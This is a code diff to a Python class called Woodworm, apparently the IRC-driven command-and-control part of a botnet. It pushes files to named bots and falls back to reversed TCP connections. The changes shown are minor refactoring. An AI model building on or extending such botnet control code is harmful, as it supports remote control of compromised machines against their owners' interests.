@@ -6,7 +6,7 @@ from botnet import botnet_database
 from botnet.tcp import tcp_services
 import socket
 import os
-import sys
+import threading
 import datetime
 from ftp import ftp_services
 from web import http_services
@@ -146,6 +146,7 @@ class Woodworm:
         filename = kwargs.get('filename')
         receiver = kwargs.get('receiver')
         nickname = kwargs.get('nickname')
+
         file_path = os.path.join(self.pathToFiles, filename)
 
         if not os.path.exists(file_path):
@@ -162,7 +163,7 @@ class Woodworm:
         if not tcpSession.isActive:
             logging.warning(f"Bot {receiver} has no connection, trying to use reversed connection")
             tcpSession = bot.get_reversed_tcp_session()
-            
+
         if not tcpSession.isActive:
             logging.error(f"Bot {receiver} has no active connections")
             await irc_connection.send_query(nickname, f"Bot {receiver} has no active connections")
@@ -171,9 +172,11 @@ class Woodworm:
         if tcpSession.isSendingData:
             await irc_connection.send_query(nickname, f"Bot {receiver} is busy sending other file")
             return
-
-        coro = asyncio.to_thread(tcpSession.send_file, file_path, nickname=nickname, receiver=receiver)
+        coro = asyncio.to_thread(tcpSession.send_file, filename=file_path, nickname=nickname, receiver=receiver)
+        # thread = threading.Thread(target=tcpSession.send_file, kwargs={'filename' : file_path, 'nickname': nickname, 'receiver': receiver})
         task = asyncio.create_task(coro)
+        # thread.start()
+        
         await irc_connection.send_query(nickname, f"Transfer of {filename} to {receiver} started")
 
 
@@ -307,7 +310,7 @@ class Woodworm:
 
 
     async def tcpSession_onSendingFinished(self, *args, **kwargs):
-        filename = kwargs.get('filename')
+        filename = kwargs.get('file')
         nickname = kwargs.get('nickname')
         receiver = kwargs.get('receiver')
         tput = kwargs.get('tput')
@@ -317,7 +320,7 @@ class Woodworm:
 
     async def tcpSession_onSendingProgress(self, *args, **kwargs):
         nickname = kwargs.get('nickname')
-        filename = kwargs.get('filename')
+        filename = kwargs.get('file')
         progress = kwargs.get('progress')
         receiver = kwargs.get('receiver')
         tput = kwargs.get('tput')
